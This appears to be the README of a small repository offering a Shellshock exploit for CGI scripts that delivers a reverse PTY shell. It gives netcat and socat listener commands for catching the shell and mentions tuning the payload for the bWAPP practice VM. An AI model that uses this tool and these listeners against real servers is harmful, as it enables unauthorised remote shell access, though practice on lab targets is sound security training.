# shellshock
Trivial shellshock exploit, for CGI scripts...  
Delivers a reverse PTY (depends on Python for PTY).  
Needed this for a thing once and decided to share.  

To get a decent shell, use one of the below listeners.
```
stty -echo raw; nc -l -p 1337; stty sane
```
or
```
socat -,echo=0,raw tcp4-listen:1337
```
There are a couple of payloads in there. The one I had that worked most of the 
time didn't work on beebox bwapp vm, so I wrote another one for that which is now 
the default. whatever. you get the idea.

![screenshot](https://raw.githubusercontent.com/mycotoxic/shellshock/master/screenshot.png)
